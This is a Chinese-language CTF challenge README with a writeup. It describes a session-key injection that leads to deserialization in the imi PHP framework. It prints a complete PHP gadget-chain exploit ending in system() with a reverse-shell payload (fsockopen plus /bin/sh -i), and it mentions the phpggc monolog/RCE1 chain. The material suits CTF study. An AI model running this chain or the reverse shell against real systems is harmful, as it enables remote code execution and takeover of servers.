# ezosu

# How to Start and Stop
## start
```shell
docker-compose up -d
```

## stop
```shell
docker-compose down --rmi all
```

# writeup

## unsafe session
本题利用了一个名为`imi`的框架。

本题有且只有一个路由由php处理`/config`，其实现如下：

![image-20211229211433630](https://gitee.com/AFKL/image/raw/master/img/image-20211229211433630.png)

这个路由的代码中最惹人注意的地方是，session的键值是可以被用户控制的。

imi框架是用swoole起点的，但swoole本身不支持php的原生session，所以为了兼容原生的session，imi框架自己写了一个session模块，并兼容了原生session。

在原生session文件处理的实现中，开发者使用`|`对属性进行分割，但键名没有过滤，可以插入`|`。如果用户可控键名，那么就会导致反序列化逃逸。

![image-20211229210444085](https://gitee.com/AFKL/image/raw/master/img/image-20211229210444085.png)

## find gadget

那么接下来就是找反序列化链了。本次比赛的选手找到了各种各样的链，这里先说一下预期链：

由于本人在测试时并没有找到`destruct`触发的链。所以基于反序列化函数后的代码尝试触发`toString`。但我们可以看到反序列化得到的对象，经过两行代码后就进入了`serialize`函数中。这意味着我们可以通过触发`__sleep`来触发一条序列化链。

这里是我找到的gadget。
```php
<?php
namespace Symfony\Component\String {
    class LazyString {
        private $value;

        public function __construct($a)
        {
            $this->value = $a;
        }
    }
}

namespace Imi\Aop {
    class JoinPoint {
        protected array $args;
    }

    class AroundJoinPoint extends JoinPoint {
        private $nextProceed;

        public function __construct($a, $b)
        {
            $this->args = $a;
            $this->nextProceed = $b;
        }
    }
}

namespace GrahamCampbell\ResultType {
    class Success {
        private $value;

        public function __construct($a)
        {
            $this->value = $a;
        }
    }
}

namespace {
    $ip = "127%2E0%2E%2E1";
    $re = "php -r '\$sock=fsockopen(urldecode(\"$ip\"),8888);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";

    $exp = new \Symfony\Component\String\LazyString(
        [
            new \Imi\Aop\AroundJoinPoint(
                [new \GrahamCampbell\ResultType\Success($re), "flatMap"], 
                [new \GrahamCampbell\ResultType\Success("system"), "flatMap"]
            ),
            "proceed"
        ]
    );
    echo json_encode(["aaa|".serialize($exp)."aa" => "aaaa"]);
}
```

入口是十分经典的`LazyString`，其`__sleep`会去调用`__toString`方法。一些选手使用此方法以为是什么神秘的地方调用了`__toString`，实际上是调用了`__sleep`方法。

![image-20211229232716199](https://gitee.com/AFKL/image/raw/master/img/image-20211229232716199.png)

这里我们可以调用任意类的公共方法，这里我选择了`Imi\Aop\AroundJoinPoint::proceed`:

![image-20211229232832689](https://gitee.com/AFKL/image/raw/master/img/image-20211229232832689.png)
其参数默认为null，`$args`可以通过父类属性获取，但必须是`array`类型。这个地方的动态调用虽然函数可控，但参数只有一个，且参数类型必须是`array`，是无法getshell的。那么就继续找存在动态调用的公共方法。

最终找到了`GrahamCampbell\ResultType\Success::flatMap`，其参数必须是`callable`类型。

![image-20211229233610931](https://gitee.com/AFKL/image/raw/master/img/image-20211229233610931.png)

动态调用公共方法的数组是被算作`callable`类型的，所以只要利用两次这个方法即可。

![调用流程图](https://gitee.com/AFKL/image/raw/master/img/未命名文件.png)

## other gadget

当然我说过，gadget不止这一条。有人使用`phpggc`的`monolog/RCE1`就直接打穿了（草）。
很想吐槽monolog，你都2.3.5版本了，怎么还不修链，学学人家yii啊，搞的我这道题都是非预期（bushi

还有一些队伍使用`monolog`的`destruct`加其它的类来触发反序列化链，就不说了。

如果抛开`monolog`的话，本题找`destruct`或`wakeup`起点的链其实很难。因为此框架的类属性都是限定类型的，那么找gadget就会变成java那样比较麻烦。目前来看目前没有一个队伍的起点是`imi`框架里的。

## other print

因为开发者设置的特殊规则，session键值中的`.`符号会被解释为子属性。因此链中的`.`符号必须进行特殊处理。比如我这里使用php反弹shell时将会被转义的符号url编码，在执行反弹shell代码的时候再解开。